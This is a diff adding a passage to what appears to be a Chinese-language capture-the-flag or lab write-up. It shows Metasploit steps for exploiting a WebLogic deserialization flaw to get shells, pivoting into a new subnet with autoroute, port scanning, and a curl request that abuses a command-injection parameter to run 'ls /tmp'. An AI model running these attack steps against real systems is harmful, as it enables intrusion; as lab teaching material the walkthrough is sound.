@@ -389,6 +389,84 @@ use scanner/portscan/tcp
 
 ![](.assets_img/README/subnet_84_services.png)
 
+#### 使用 multi/misc/weblogic_deserialize_asyncresponseservice
+
+```bash
+use multi/misc/weblogic_deserialize_asyncresponseservice
+```
+
+![](.assets_img/README/weblogic_config.png)
+
+成功获取 `192.169.84.2` 主机 `shell`：
+
+![](.assets_img/README/get_shell_84_2.png)
+
+获取 `flag`：
+
+![](.assets_img/README/get_84_2_flag.png)
+
+同理，可以打下 `192.169.84.3` & `192.169.84.4` 并获取 `flag`：
+
+#### 查看当前所有肉鸡的路由表
+
+查看当前所有肉鸡的路由表以尝试横向移动：
+
+```bash
+sessions -c 'ip route'
+```
+
+发现在 `session 14 (192.169.84.3)` 中存在未知网段 `192.169.86.0/24`
+
+![](.assets_img/README/get_all_route_table.png)
+
+更新当前网络路由表：
+
+```bash
+use multi/manage/autoroute
+set SUBNET 192.169.86.0
+set SESSION 16
+```
+
+配置如下：
+
+![](.assets_img/README/autoroute_86.png)
+
+更新后的路由表如下：
+
+![](.assets_img/README/new_route_table.png)
+
+#### 扫描 `192.169.86.0/24`
+
+```bash
+use scanner/portscan/tcp
+```
+
+配置如下：
+
+![](.assets_img/README/86_24_config.png)
+
+![](.assets_img/README/86_24_scan_result.png)
+
+发现 `192.169.86.3:80` 中有服务：
+
+#### 攻下 `192.169.86.3`
+
+使用代理进行访问：
+
+```bash
+curl 192.169.86.3:80 -x socks5://127.0.0.1:1080; echo ''
+```
+
+![](.assets_img/README/proxy_curl.png)
+
+已经在非常明显地提示我们这是一个 `命令执行漏洞` 了：
+
+```bash
+curl "192.169.86.3:80/index.php?cmd=ls+/tmp" -x socks5://127.0.0.1:1080; echo ''
+```
+
+![](.assets_img/README/get_flag.png)
+
 <!-- ## Debug
 
 在使用以下的 `python` 脚本验证 `log4j2` 漏洞时，遇到了下面的问题：
